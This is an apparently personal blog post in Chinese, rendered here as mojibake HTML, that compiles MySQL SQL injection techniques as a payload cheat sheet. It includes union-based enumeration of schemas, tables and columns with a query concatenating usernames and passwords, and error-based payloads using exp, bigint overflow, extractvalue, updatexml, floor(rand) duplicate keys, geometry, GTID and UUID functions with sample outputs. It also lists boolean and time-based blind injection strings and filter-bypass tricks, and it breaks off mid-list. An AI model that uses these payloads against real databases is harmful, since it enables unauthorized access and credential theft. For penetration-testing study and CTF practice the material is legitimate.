        <content type="html"><![CDATA[<p>SQL æ³¨å…¥è¿™æ–¹é¢ä¸€ç›´æŒºèœçš„ï¼Œæ•´ç†ä¸€ä¸‹å§</p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h3><h4 id="åˆ¤æ–­-column-æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®"><a href="#åˆ¤æ–­-column-æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®" class="headerlink" title="åˆ¤æ–­ column æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®"></a>åˆ¤æ–­ column æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®</h4><ul><li><code>order/group by N</code></li><li><code>union select 1,2,3...N</code></li></ul><hr><p>æ³¨æ„ï¼š</p><ul><li>è‹¥ç¡®å®šé¡µé¢æœ‰å›æ˜¾ï¼Œä½†æ˜¯é¡µé¢ä¸­å¹¶æ²¡æœ‰æˆ‘ä»¬å®šä¹‰çš„ç‰¹æ®Šæ ‡è®°æ•°å­—å‡ºç°ï¼Œå¯èƒ½æ˜¯é¡µé¢é™åˆ¶äº†å•è¡Œæ•°æ®è¾“å‡ºï¼Œæˆ‘ä»¬è®©å‰è¾¹çš„ select æŸ¥è¯¢æ¡ä»¶è¿”å›ç»“æœä¸ºç©ºå³å¯</li><li>æ³¨æ„ä¸€å®šè¦æ‹¼æ¥å¤Ÿè¶³å¤Ÿçš„å­—æ®µæ•°ï¼Œå¦åˆ™ SQL è¯­å¥æŠ¥é”™ã€‚PSï¼šæ­¤æ–¹æ³•ä¹Ÿå¯ä½œä¸ºåˆ¤æ–­å‰æ¡ select è¯­å¥çš„æ–¹æ³•ä¹‹ä¸€</li></ul><hr><h4 id="çˆ†åº“ã€è¡¨ã€å­—æ®µ"><a href="#çˆ†åº“ã€è¡¨ã€å­—æ®µ" class="headerlink" title="çˆ†åº“ã€è¡¨ã€å­—æ®µ"></a>çˆ†åº“ã€è¡¨ã€å­—æ®µ</h4><ul><li><p>MySQL version &lt; 5.0</p><ul><li><p>ç”±äº MySQL çš„ä½ç‰ˆæœ¬ç¼ºä¹ç³»ç»Ÿåº“<code>information_schema</code>ï¼Œæ•…é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥æŸ¥è¯¢è¡¨åï¼Œå­—æ®µï¼ˆåˆ—ï¼‰åç­‰ä¿¡æ¯</p><p>è¿™æ—¶å€™åªèƒ½é çŒœæ¥è§£å†³ï¼Œç›´æ¥çŒœè¡¨åä¸åˆ—åæ˜¯ä»€ä¹ˆï¼Œç”šè‡³æ˜¯åº“åï¼Œå†ä½¿ç”¨è”åˆæŸ¥è¯¢å–æ•°æ®</p><p>è‹¥çŸ¥é“ä»…è¡¨åè€Œä¸çŸ¥é“åˆ—ï¼ˆå­—æ®µï¼‰åï¼Œå¯ä»¥å°è¯•ï¼š</p><ul><li><p>å•å­—æ®µï¼š<code>select *,1,2,xxx from table_name</code></p></li><li><p>å¤šå­—æ®µï¼š<code>select x from(select 1,2,3,4,xxx from table_name union select * from table_name)a</code></p></li></ul></li></ul></li><li><p>MySQL version &gt;= 5.0</p><ul><li><p>çˆ† schema</p><ul><li><code>union select 1,2,schema_name from information_schema.schemata limit 1,1</code></li></ul></li><li><p>çˆ† table</p><ul><li><p><code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</code></p></li><li><p><code>union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1</code></p></li></ul></li><li><p>çˆ† column</p><ul><li><code>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;Du1&#39;</code></li><li><code>union select 1,2,column_name from information_schema.columns where table_schema=database() limit 0,1</code></li></ul></li><li><p>å‡º</p><ul><li><code>select heart from Du1</code></li><li><code>SELECT CONCAT(username, &quot;:&quot; ,password) FROM Du1.USER</code></li></ul></li></ul></li></ul><h3 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h3><p>é€šè¿‡ç‰¹æ®Šå‡½æ•°çš„æŠ¥é”™ä½¿å…¶å‚æ•°è¢«é¡µé¢è¾“å‡º</p><hr><p>å‰æï¼š</p><ul><li>æœåŠ¡å™¨å¼€å¯æŠ¥é”™ä¿¡æ¯è¿”å›ï¼Œä¹Ÿå°±æ˜¯å‘ç”Ÿé”™è¯¯æ—¶è¿”å›æŠ¥é”™ä¿¡æ¯</li></ul><p>æ³¨æ„ï¼š</p><ul><li>æŠ¥é”™å‡½æ•°é€šå¸¸æœ‰æœ€é•¿æŠ¥é”™è¾“å‡ºçš„é™åˆ¶ï¼Œé¢å¯¹è¿™ç§æƒ…å†µï¼Œå¯ä»¥è¿›è¡Œåˆ†å‰²è¾“å‡º<ul><li><code>#define ERRMSGSIZE (512)</code></li></ul></li><li>ç‰¹æ®Šå‡½æ•°çš„ç‰¹æ®Šå‚æ•°è¿›è¿è¡Œä¸€ä¸ªå­—æ®µã€ä¸€è¡Œæ•°æ®çš„è¿”å›ï¼Œä½¿ç”¨ group_concat ç­‰å‡½æ•°èšåˆæ•°æ®å³å¯</li></ul><hr><h4 id="åˆ©ç”¨-overflow"><a href="#åˆ©ç”¨-overflow" class="headerlink" title="åˆ©ç”¨ overflow"></a>åˆ©ç”¨ overflow</h4><p>æ³¨ï¼šMySQL version &gt; 5.5.5 çš„æ—¶å€™ overflow æ‰ä¼šæœ‰é”™è¯¯è®¯æ¯ï¼ŒMySQL version &gt; 5.5.53 çš„æ—¶å€™ä¸ä¼šæ˜¾ç¤ºæŸ¥è¯¢ç»“æœ</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p>é€‚ç”¨ç‰ˆæœ¬ï¼š5.5.49~5.5.5</p><p>è¯¥å‡½æ•°ä¼šè¿”å› e çš„ x æ¬¡æ–¹ç»“æœ</p><p>å› ä¸º MySQL èƒ½è®°å½•çš„ double æ•°å€¼èŒƒå›´æœ‰é™ï¼Œä¸€æ—¦ç»“æœè¶…è¿‡èŒƒå›´ï¼Œåˆ™è¯¥å‡½æ•°æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(709) &#x3D;&gt; 8.218407461554972e307</span><br><span class="line">SELECT exp(710) &#x3D;&gt; ERROR</span><br></pre></td></tr></table></figure><p>æ•…å¯ä½œ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(~(SELECT * FROM (SELECT user())x));</span><br><span class="line">ERROR 1690(22003): DOUBLE value is out of range in &#39;exp(~((SELECT &#39;root@localhost&#39; FROM dual)))&#39;</span><br></pre></td></tr></table></figure><p>æŒ‰ç†æ¥è¯´ <code>pow</code> åº”è¯¥ä¹Ÿå¯ä»¥ï¼ŒåŸç†ç›¸åŒ</p><hr><h5 id="bigint-æ•°å€¼æ“ä½œ"><a href="#bigint-æ•°å€¼æ“ä½œ" class="headerlink" title="bigint æ•°å€¼æ“ä½œ"></a>bigint æ•°å€¼æ“ä½œ</h5><p>åˆ©ç”¨äº†å½“ MySQL æ•°æ®åº“çš„æŸäº›è¾¹ç•Œæ•°å€¼è¿›è¡Œæ•°å€¼è¿ç®—æ—¶ï¼Œä¼šæŠ¥é”™çš„åŸç†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT ~0 &#x3D;&gt; 18446744073709551615</span><br><span class="line">SELECT ~0 + 1 &#x3D;&gt; ERROR</span><br><span class="line">SELECT cot(0) &#x3D;&gt; ERROR</span><br><span class="line"></span><br><span class="line">select !(select * from(select user())a)-~0;</span><br><span class="line">select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨-xpath"><a href="#åˆ©ç”¨-xpath" class="headerlink" title="åˆ©ç”¨ xpath"></a>åˆ©ç”¨ xpath</h4><h5 id="extractvalue-é•¿åº¦é™åˆ¶32ä½"><a href="#extractvalue-é•¿åº¦é™åˆ¶32ä½" class="headerlink" title="extractvalue (é•¿åº¦é™åˆ¶32ä½)"></a>extractvalue (é•¿åº¦é™åˆ¶32ä½)</h5><p>åŸç†ï¼šå‰åæ·»åŠ  ~ ä½¿å…¶ä¸ç¬¦åˆ xpath æ ¼å¼ä»è€ŒæŠ¥é”™</p><p>é€‚ç”¨ç‰ˆæœ¬ 5.1.5+</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure><h5 id="updatexml-é•¿åº¦é™åˆ¶32ä½"><a href="#updatexml-é•¿åº¦é™åˆ¶32ä½" class="headerlink" title="updatexml (é•¿åº¦é™åˆ¶32ä½)"></a>updatexml (é•¿åº¦é™åˆ¶32ä½)</h5><p>é€‚ç”¨ç‰ˆæœ¬ 5.1.5+</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™-ä¸»é”®é‡å¤"><a href="#åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™-ä¸»é”®é‡å¤" class="headerlink" title="åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™ / ä¸»é”®é‡å¤"></a>åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™ / ä¸»é”®é‡å¤</h4><p>åŸç†ï¼šç®€å•æ¥è¯´ï¼Œæ˜¯ç”±äº where æ¡ä»¶æ¯æ‰§è¡Œä¸€æ¬¡ï¼Œrand å‡½æ•°å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœåœ¨ç”±äºåœ¨ç»Ÿè®¡æ•°æ®æ—¶åˆ¤æ–­ä¾æ®ä¸èƒ½åŠ¨æ€æ”¹å˜ï¼Œæ•… <code>rand()</code> ä¸èƒ½åæ¥åœ¨<code>order/group by</code> ä¸Š</p><hr><p>ä¸¾æ —å­ï¼š</p><p>å‡è®¾ USER è¡¨æœ‰ä¸‰æ¡æ•°æ®ï¼Œæˆ‘ä»¬é€šè¿‡ï¼š<code>select * from USER group by username</code> æ¥é€šè¿‡å…¶ä¸­çš„ username å­—æ®µè¿›è¡Œåˆ†ç»„</p><p>æ­¤è¿‡ç¨‹ä¼šå…ˆå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œå­˜åœ¨ä¸¤ä¸ªå­—æ®µï¼š<code>keyï¼Œcount</code></p><p>å…¶ä¸­æˆ‘ä»¬é€šè¿‡ username æ¥åˆ¤æ–­ï¼Œå…¶åœ¨æ­¤å¤„æ˜¯å­—æ®µï¼Œé¦–å…ˆå…ˆå–ç¬¬ä¸€è¡Œçš„æ•°æ®ï¼š<code>username=Du1&amp;password=0312</code></p><p>username ä¸º Du1 å‡ºç°ä¸€æ¬¡ï¼Œåˆ™ç°åœ¨è™šè¡¨å†…æŸ¥è¯¢æ˜¯å¦å­˜åœ¨ Du1ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™ count + 1ï¼Œè‹¥ä¸å­˜åœ¨ï¼Œåˆ™æ·»åŠ  Du1ï¼Œå…¶ count ä¸º 1</p><p>å¯¹äº<code>floor(rand(0)*2)</code>ï¼Œå…¶ä¸­<code>rand()</code>å‡½æ•°ï¼Œä¼šç”Ÿæˆ 0 ~ 1 ä¹‹é—´éšæœºä¸€ä¸ªå°æ•°ã€<code>floor()</code>å–æ•´æ•°éƒ¨åˆ†ã€0 æ˜¯éšæœºå› å­ã€ä¹˜ 2 æ˜¯ä¸ºäº†è®©å¤§äº 0.5 çš„å°æ•°é€šè¿‡ floor å‡½æ•°å¾— 1</p><p>è‹¥è¡¨ä¸­æœ‰ä¸‰è¡Œæ•°æ®ï¼šæˆ‘ä»¬é€šè¿‡<code>select * from USER group by floor(rand(0)*2)</code>è¿›è¡Œæ’åºçš„è¯</p><blockquote><p>æ³¨æ„ï¼š</p><p>ç”±äº<code>rand(0)</code>çš„éšæœºå› å­æ˜¯è¢«å›ºå®šçš„ï¼Œæ•…å…¶äº§ç”Ÿçš„éšæœºæ•°ä¹Ÿè¢«å›ºå®šäº†ï¼Œé¡ºåºä¸ºï¼š011011â€¦â€¦</p></blockquote><p>é¦–å…ˆ<code>group by</code>éœ€è¦æ‰§è¡Œçš„è¯ï¼Œéœ€è¦ç¡®å®šåˆ†ç»„å› å­ï¼Œæ•…<code>floor(rand(0)*2)</code>è¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¾—åˆ°çš„ç»“æœä¸º 0ï¼Œæ¥ç€åœ¨è™šè¡¨å†…æ£€ç´¢ 0ï¼Œå‘ç°è™šè¡¨æ²¡æœ‰é”®å€¼ä¸º 0 çš„è®°å½•ï¼Œæ•…æ·»åŠ ä¸Šï¼Œåœ¨è¿›è¡Œæ·»åŠ æ—¶ï¼š<code>floor(rand(0)*2)</code>ç¬¬äºŒæ¬¡è¢«æ‰§è¡Œï¼Œå¾—åˆ°ç»“æœ 1ï¼Œäºæ˜¯è™šæ‹Ÿè¡¨æ’å…¥çš„å†…å®¹ä¸º<code>key=1&amp;count=1</code></p><p>ç¬¬äºŒæ¬¡æ‰§è¡Œ<code>group by</code>æ—¶ï¼š<code>floor(rand(0)*2)</code>å…ˆè¢«è¿è¡Œä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸‰æ¬¡è¿è¡Œã€‚å¾—åˆ°ç»“æœ 1ï¼ŒæŸ¥è¯¢è™šè¡¨å‘ç°æ•°æ®å­˜åœ¨ï¼Œå› è€Œç›´æ¥è®©è™šè¡¨å†…çš„<code>key=1</code>çš„ count åŠ ä¸€å³å¯ï¼Œ<code>floor(..)</code>åªè¿è¡Œäº†ä¸€æ¬¡</p><p>ç¬¬ä¸‰æ¬¡æ‰§è¡Œ<code>group by</code>æ—¶ï¼Œ<code>floor(rand(0)*2)</code>è¢«æ‰§è¡Œç¬¬å››æ¬¡ï¼Œå¾—åˆ°ç»“æœ 0ï¼ŒæŸ¥è¯¢è™šè¡¨ä¸å­˜åœ¨ã€‚å†æ’å…¥è™šè¡¨æ—¶ï¼Œ<code>floor(â€¦)</code>è¢«æ‰§è¡Œç¬¬äº”æ¬¡ï¼Œå¾—åˆ°ç»“æœ 1ï¼Œæ•…æ­¤æ—¶è™šè¡¨å°†æ’å…¥çš„å€¼ä¸º<code>key=1&amp;count=1</code>ï¼Œæ³¨æ„ï¼Œæ­¤æ—¶è™šè¡¨å·²æœ‰ä¸€æ¡è®°å½•ä¸ºï¼š<code>key=1&amp;count=2</code>ï¼Œå¹¶ä¸”å­—æ®µ key ä¸ºä¸»é”®ï¼Œå…·æœ‰ä¸å¯é‡å¤æ€§ï¼Œæ•…è™šè¡¨åœ¨å°è¯•æ’å…¥æ—¶å°†äº§ç”Ÿé”™è¯¯</p><hr><p>æ•…å¯ä½œ payloadï¼š<code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p><p><img src="https://i.loli.net/2021/04/26/zfHIm7y31G5MsZU.png"></p><p><code>select count(*) from test group by concat(version(),floor(rand(0)*2));</code></p><p><img src="https://i.loli.net/2021/04/26/R6EMWit5lazIePC.png"></p><h4 id="åˆ©ç”¨å‡ ä½•å‡½æ•°"><a href="#åˆ©ç”¨å‡ ä½•å‡½æ•°" class="headerlink" title="åˆ©ç”¨å‡ ä½•å‡½æ•°"></a>åˆ©ç”¨å‡ ä½•å‡½æ•°</h4><ul><li>GeometryCollectionï¼š<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li><li>polygonï¼š<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li><li>multipointï¼š<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li><li>multilinestringï¼š<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li><li>linestringï¼š<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li><li>multipolygonï¼š<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li></ul><h4 id="åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°"><a href="#åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°" class="headerlink" title="åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°"></a>åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°</h4><p>éšä¾¿ç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œå¯èƒ½ä¼šæ‘¸å¥–å¾—åˆ°å½“å‰æ‰€åœ¨çš„æ•°æ®åº“åç§°</p><p><img src="https://i.loli.net/2021/04/26/UCKcN46HYWITbBu.png"></p><h4 id="åˆ©ç”¨-name-const"><a href="#åˆ©ç”¨-name-const" class="headerlink" title="åˆ©ç”¨ name_const"></a>åˆ©ç”¨ name_const</h4><p>ä»…å¯å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</p><p>payloadï¼š<code>select * from(select name_const(version(),0x1),name_const(version(),0x1))a</code></p><p><img src="https://i.loli.net/2021/04/26/XhTW5evptx8EHnC.png"></p><h4 id="uuid-ç›¸å…³å‡½æ•°"><a href="#uuid-ç›¸å…³å‡½æ•°" class="headerlink" title="uuid ç›¸å…³å‡½æ•°"></a>uuid ç›¸å…³å‡½æ•°</h4><p>é€‚ç”¨ç‰ˆæœ¬ï¼š8.0.x</p><p>because of å‚æ•°æ ¼å¼ä¸æ­£ç¡®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT UUID_TO_BIN((SELECT password FROM users WHERE id&#x3D;1));</span><br><span class="line">SELECT BIN_TO_UUID((SELECT password FROM users WHERE id&#x3D;1));</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªğŸ‘´è¿˜æ²¡æµ‹</p><h4 id="GTID-ç›¸å…³å‡½æ•°"><a href="#GTID-ç›¸å…³å‡½æ•°" class="headerlink" title="GTID ç›¸å…³å‡½æ•°"></a>GTID ç›¸å…³å‡½æ•°</h4><p>åŒæ ·ä¹Ÿæ˜¯å‚æ•°æ ¼å¼ä¸æ­£ç¡®ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select gtid_subset(user(),1);</span><br><span class="line">select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);</span><br><span class="line">select gtid_subtract((select * from(select user())a),1);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/AxWCeFVRBES7plz.png"></p><h4 id="join-using-æ³¨åˆ—å"><a href="#join-using-æ³¨åˆ—å" class="headerlink" title="join using æ³¨åˆ—å"></a>join using æ³¨åˆ—å</h4><p>é€šè¿‡ç³»ç»Ÿå…³é”®è¯ join å¯å»ºç«‹ä¸¤ä¸ªè¡¨ä¹‹é—´çš„å†…è¿æ¥ï¼Œé€šè¿‡å¯¹æƒ³è¦æŸ¥è¯¢åˆ—åçš„è¡¨ä¸å…¶è‡ªèº«å»ºç«‹å†…è¿æ¥ï¼Œä¼šç”±äºå†—ä½™çš„åŸå› ï¼ˆç›¸åŒåˆ—åå­˜åœ¨ï¼‰è€Œå‘ç”Ÿé”™è¯¯ï¼Œå¹¶ä¸”æŠ¥é”™ä¿¡æ¯ä¼šå­˜åœ¨é‡å¤çš„åˆ—åï¼Œå¯ä»¥ä½¿ç”¨ USING è¡¨è¾¾å¼å£°æ˜å†…è¿æ¥ï¼ˆINNER JOINï¼‰æ¡ä»¶æ¥é¿å…æŠ¥é”™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from users a join (select * from users)b)c;</span><br><span class="line">select * from(select * from users a join (select * from users)b using(username))c;</span><br><span class="line">select * from(select * from users a join (select * from users)b using(username,password))c</span><br></pre></td></tr></table></figure><p>ğŸ‘´ä¸å’‹æ‡‚ï¼Œå¸Œæœ›å“ªä½SQLğŸ‘´å¯ä»¥å¸¦å¸¦ğŸ‘´</p><h4 id="ST-ç›¸å…³å‡½æ•°"><a href="#ST-ç›¸å…³å‡½æ•°" class="headerlink" title="ST ç›¸å…³å‡½æ•°"></a>ST ç›¸å…³å‡½æ•°</h4><p>MySQL 5.7</p><ul><li><code>select ST_LatFromGeoHash(version());</code></li><li><code>select ST_LongFromGeoHash(version());</code></li><li><code>select ST_PointFromGeoHash(version(),1);</code></li></ul><p><img src="https://i.loli.net/2021/04/26/hmOj8uBfU2PEiRq.png"></p><hr><h4 id="æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨"><a href="#æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨" class="headerlink" title="æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨"></a>æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨</h4><p>æ³¨ï¼šé»˜è®¤MYSQL_ERRMSG_SIZE=512</p><table><thead><tr><th>ç±»åˆ«</th><th>å‡½æ•°</th><th>ç‰ˆæœ¬éœ€æ±‚</th><th>5.5.x</th><th>5.6.x</th><th>5.7.x</th><th>8.x</th><th>å‡½æ•°æ˜¾é”™é•¿åº¦</th><th>MysqlæŠ¥é”™å†…å®¹é•¿åº¦</th><th>é¢å¤–é™åˆ¶</th></tr></thead><tbody><tr><td>ä¸»é”®é‡å¤</td><td>floor round</td><td>â“</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td>64</td><td></td><td>data_type â‰  varchar</td></tr><tr><td>åˆ—åé‡å¤</td><td>name_const</td><td>â“</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td></td><td>only version()</td></tr><tr><td></td><td>join</td><td>[5.5.49, ?)</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td></td><td>only columns</td></tr><tr><td>æ•°æ®æº¢å‡º - Double</td><td>1e308 cot exp pow</td><td>[5.5.5, 5.5.48]</td><td>âœ”ï¸</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>æ•°æ®æº¢å‡º - BIGINT</td><td></td><td>[5.5.5, 5.5.48]</td><td>âœ”ï¸</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>å‡ ä½•å¯¹è±¡</td><td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td><td>[?, 5.5.48]</td><td>âœ”ï¸</td><td></td><td></td><td></td><td></td><td>244</td><td></td></tr><tr><td>ç©ºé—´å‡½æ•° Geohash</td><td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td><td>[5.7, ?)</td><td></td><td></td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>128</td><td></td><td></td></tr><tr><td>GTID</td><td>gtid_subset gtid_subtract</td><td>[5.6.5, ?)</td><td></td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>200</td><td></td><td></td></tr><tr><td>JSON</td><td>json_*</td><td>[5.7.8, 5.7.11]</td><td></td><td></td><td>âœ”ï¸</td><td></td><td>200</td><td></td><td></td></tr><tr><td>UUID</td><td>uuid_to_bin bin_to_uuid</td><td>[8.0, ?)</td><td></td><td></td><td></td><td>âœ”ï¸</td><td>128</td><td></td><td></td></tr><tr><td>XPath</td><td>extractvalue updatexml</td><td>[5.1.5, ?)</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>32</td><td></td><td></td></tr></tbody></table><p>æ‘˜è‡ªâ€”â€”<a href="https://blog.sari3l.com/posts/9622f295/">Mysql æ³¨å…¥åŸºç¡€å°ç»“</a></p><hr><h3 id="Blind-Based"><a href="#Blind-Based" class="headerlink" title="Blind Based"></a>Blind Based</h3><h4 id="Booleanï¼ˆ1-or-0ï¼‰"><a href="#Booleanï¼ˆ1-or-0ï¼‰" class="headerlink" title="Booleanï¼ˆ1 or 0ï¼‰"></a>Booleanï¼ˆ1 or 0ï¼‰</h4><ul><li><code>id=87 and length(user())&gt;0</code></li><li><code>id=87 and length(user())&gt;100</code></li><li><code>id=87 and ascii(mid(user(),1,1))&gt;100</code></li><li><code>id=87 or ((select user()) regexp binary &#39;^[a-z]&#39;)</code></li></ul><h4 id="Timeï¼ˆæ— å›æ˜¾ï¼‰"><a href="#Timeï¼ˆæ— å›æ˜¾ï¼‰" class="headerlink" title="Timeï¼ˆæ— å›æ˜¾ï¼‰"></a>Timeï¼ˆæ— å›æ˜¾ï¼‰</h4><ul><li><code>id=87 and if(length(user())&gt;0, sleep(10), 1)=1</code></li><li><code>id=87 and if(length(user())&gt;100, sleep(10), 1)=1</code></li><li><code>id=87 and if(ascii(mid(user(),1,1))&gt;100, sleep(10), 1)=1</code></li></ul><h3 id="Common-Bypass"><a href="#Common-Bypass" class="headerlink" title="Common Bypass"></a>Common Bypass</h3><h4 id="and-or"><a href="#and-or" class="headerlink" title="and / or"></a>and / or</h4><ol><li>åŒå†™ ananddã€oorr</li><li>ä½¿ç”¨è¿ç®—ç¬¦ä»£æ›¿ &amp;&amp;ã€||</li><li>ç›´æ¥æ‹¼æ¥ = å·ï¼Œsuch as <code>?id=1=(condition)</code></li><li>å…¶ä»–æ–¹æ³•ï¼Œsuch as <code>?id=1^(condition)</code></li><li>å¤§å°å†™</li><li>urlencode</li></ol><h4 id="ç©ºæ ¼"><a href="#ç©ºæ ¼" class="headerlink" title="ç©ºæ ¼"></a>ç©ºæ ¼</h4><ol><li>å¤šå±‚ç©ºæ ¼åµŒå¥—</li><li>æ”¹ç”¨ +</li><li>ä½¿ç”¨æ³¨é‡Š /**/</li><li>and / or åé¢å¯ä»¥è·Ÿä¸Šå¶æ•°ä¸ª !ã€~ å¯ä»¥æ›¿ä»£ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥æ··åˆä½¿ç”¨ï¼ˆè§„å¾‹åˆä¸åŒï¼‰</li><li><code>%09, %0a, %0b, %0c, %0d, %a0</code> ç­‰éƒ¨åˆ†ä¸å¯è§å­—ç¬¦å¯ä¹Ÿä»£æ›¿ç©ºæ ¼</li></ol><p>such as <code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p><h4 id="æ‹¬å·"><a href="#æ‹¬å·" class="headerlink" title="æ‹¬å·"></a>æ‹¬å·</h4><ul><li>order by å¤§å°æ¯”è¾ƒç›²æ³¨</li></ul><p>ä¸æ‡‚QAQï¼Œæ±‚æ•™</p><h4 id="é€—å·"><a href="#é€—å·" class="headerlink" title="é€—å·"></a>é€—å·</h4><ol><li>æ”¹ç”¨ç›²æ³¨</li><li><code>UNION SELECT 1,2,3</code> =&gt; <code>UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)</code></li><li><code>mid(user(), 1, 1)</code> =&gt; <code>mid(user() from 1 for 1)</code></li><li><code>LIMIT N, M</code> =&gt; <code>LIMIT M OFFSET N</code></li></ol><h4 id="å…¶ä»–ç³»ç»Ÿå…³é”®å­—"><a href="#å…¶ä»–ç³»ç»Ÿå…³é”®å­—" class="headerlink" title="å…¶ä»–ç³»ç»Ÿå…³é”®å­—"></a>å…¶ä»–ç³»ç»Ÿå…³é”®å­—</h4><ol><li>åŒå†™ç»•è¿‡å…³é”®å­—è¿‡æ»¤</li><li>ä½¿ç”¨åŒä¹‰å‡½æ•° / è¯­å¥ä»£æ›¿ï¼Œå¦‚ if å‡½æ•°å¯ç”¨<code>case when condition then 1 else 0 end</code>è¯­å¥ä»£æ›¿</li><li>å¤§å°å†™</li><li>urlencode</li></ol><h4 id="å•åŒå¼•å·è¢«è¿‡æ»¤-æ‹¦æˆª-è½¬ä¹‰"><a href="#å•åŒå¼•å·è¢«è¿‡æ»¤-æ‹¦æˆª-è½¬ä¹‰" class="headerlink" title="å•åŒå¼•å·è¢«è¿‡æ»¤ / æ‹¦æˆª / è½¬ä¹‰"></a>å•åŒå¼•å·è¢«è¿‡æ»¤ / æ‹¦æˆª / è½¬ä¹‰</h4><ol><li>éœ€è¦è·³å‡ºå•å¼•å·çš„æƒ…å†µï¼šå°è¯•æ˜¯å¦å­˜åœ¨ç¼–ç 